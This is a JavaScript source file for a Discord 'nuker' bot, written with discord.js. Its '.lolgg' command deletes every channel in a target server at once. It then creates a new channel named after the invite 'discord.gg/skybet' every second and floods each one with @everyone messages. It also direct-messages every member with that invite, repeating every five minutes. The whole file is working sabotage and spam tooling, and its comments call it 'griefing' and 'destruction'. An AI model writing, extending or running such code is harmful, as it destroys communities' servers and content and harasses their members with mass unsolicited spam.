const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');
require('dotenv').config();

// Fix for ReadableStream undefined error
if (typeof ReadableStream === 'undefined') {
  global.ReadableStream = require('stream/web').ReadableStream;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// Bot configuration from environment variables
const config = {
  token: process.env.DISCORD_TOKEN,
  targetServerId: process.env.TARGET_SERVER_ID,
  channelName: 'discord.gg/skybet',
  messageContent: '@everyone discord.gg/skybet',
  command: '.lolgg'
};

// Track if the griefing process is active
let isGriefing = false;
let spamIntervals = new Map(); // Store intervals for each channel
let createdChannels = []; // Track created channels

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  console.log('Bot is ready to execute commands');
});

client.on('messageCreate', async message => {
  // Check if the message is the command to start griefing
  if (message.content === config.command && !isGriefing) {
    // Check if the user has admin permissions
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = true;
    message.channel.send('Starting simultaneous destruction mode...');
    
    // Get the target server
    const guild = client.guilds.cache.get(config.targetServerId) || message.guild;
    
    if (!guild) {
      message.channel.send('Could not find the target server.');
      isGriefing = false;
      return;
    }
    
    // Start the simultaneous destruction process
    startSimultaneousDestruction(guild);
  }
  
  // Command to stop griefing
  if (message.content === '.stop' && isGriefing) {
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = false;
    stopAllSpam();
    message.channel.send('Destruction process stopped.');
  }
});

async function startSimultaneousDestruction(guild) {
  try {
    // Start all processes simultaneously
    deleteAllChannelsFast(guild);
    createAndSpamChannels(guild);
    dmAllMembers(guild);
    
    console.log('Started all destruction processes simultaneously');
  } catch (error) {
    console.error('Error during destruction:', error);
  }
}

async function deleteAllChannelsFast(guild) {
  console.log('Deleting all existing channels at maximum speed...');
  
  // Get all channels in the guild
  const channels = guild.channels.cache;
  
  // Create deletion promises for all channels
  const deletionPromises = [];
  
  for (const [id, channel] of channels) {
    deletionPromises.push(
      channel.delete().catch(error => {
        console.error(`Failed to delete channel ${channel.name}:`, error);
      })
    );
  }
  
  // Wait for all deletions to complete
  await Promise.all(deletionPromises);
  console.log('All channels deleted');
}

async function createAndSpamChannels(guild) {
  console.log('Starting continuous channel creation and spam...');
  
  // Create channels continuously
  const createInterval = setInterval(async () => {
    if (!isGriefing) {
      clearInterval(createInterval);
      return;
    }
    
    try {
      // Create a new channel
      const channel = await guild.channels.create({
        name: `${config.channelName}-${Date.now()}-${Math.random().toString(36).substring(7)}`,
        type: 0, // Text channel
        permissionOverwrites: [
          {
            id: guild.id,
            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages]
          }
        ]
      });
      
      createdChannels.push(channel);
      console.log(`Created channel: ${channel.name}`);
      
      // Start spamming in this new channel immediately
      startAggressiveSpam(channel);
      
      // If we have too many channels, remove the oldest ones
      if (createdChannels.length > 500) {
        const oldChannel = createdChannels.shift();
        try {
          await oldChannel.delete();
          clearInterval(spamIntervals.get(oldChannel.id));
          spamIntervals.delete(oldChannel.id);
        } catch (error) {
          console.error(`Failed to delete old channel:`, error);
        }
      }
    } catch (error) {
      console.error(`Failed to create channel:`, error);
    }
  }, 1000); // Create a new channel every second
}

function startAggressiveSpam(channel) {
  // Create an interval for this specific channel
  const interval = setInterval(async () => {
    if (!isGriefing) return;
    
    try {
      // Send 10 messages rapidly
      for (let i = 0; i < 10; i++) {
        await channel.send(config.messageContent);
      }
      console.log(`Sent 10 messages in channel: ${channel.name}`);
    } catch (error) {
      console.error(`Failed to spam in channel ${channel.name}:`, error);
    }
  }, 100); // Send 10 messages every 100ms (10 per second)
  
  // Store the interval so we can clear it later
  spamIntervals.set(channel.id, interval);
}

async function dmAllMembers(guild) {
  console.log('Starting to DM all members...');
  
  try {
    // Fetch all members
    const members = await guild.members.fetch();
    
    // DM each member
    for (const [id, member] of members) {
      if (!isGriefing) break;
      
      try {
        await member.send(config.messageContent);
        console.log(`DMed ${member.user.tag}`);
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 500));
      } catch (error) {
        console.error(`Failed to DM ${member.user.tag}:`, error);
      }
    }
    
    // After DMing everyone once, start DMing everyone again periodically
    const dmInterval = setInterval(async () => {
      if (!isGriefing) {
        clearInterval(dmInterval);
        return;
      }
      
      try {
        // Fetch all members again
        const members = await guild.members.fetch();
        
        // DM each member
        for (const [id, member] of members) {
          if (!isGriefing) break;
          
          try {
            await member.send(config.messageContent);
            console.log(`DMed ${member.user.tag}`);
            // Small delay to avoid rate limiting
            await new Promise(resolve => setTimeout(resolve, 500));
          } catch (error) {
            console.error(`Failed to DM ${member.user.tag}:`, error);
          }
        }
      } catch (error) {
        console.error('Error during periodic DM:', error);
      }
    }, 300000); // DM everyone every 5 minutes
    
  } catch (error) {
    console.error('Error during initial DM:', error);
  }
}

function stopAllSpam() {
  // Clear all spam intervals
  for (const [channelId, interval] of spamIntervals) {
    clearInterval(interval);
  }
  spamIntervals.clear();
  createdChannels = [];
}

// Login to Discord with your bot token
client.login(config.token);
